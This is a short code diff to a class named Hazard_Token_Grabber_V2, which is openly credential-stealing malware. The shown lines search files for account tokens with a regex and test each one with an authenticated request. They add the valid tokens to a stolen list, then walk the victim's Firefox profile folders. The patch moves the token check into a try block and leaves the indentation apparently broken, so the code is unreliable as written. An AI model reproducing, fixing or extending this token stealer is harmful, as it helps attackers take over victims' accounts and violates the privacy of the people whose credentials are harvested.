@@ -301,11 +301,11 @@ class Hazard_Token_Grabber_V2:
                         for token in findall(regex, line):
                             try:
                                 r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
                             except Exception:
                                 pass
-                            if r.status_code == 200:
-                                if token in self.tokens:
-                                    continue
                                 self.tokens.append(token)
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
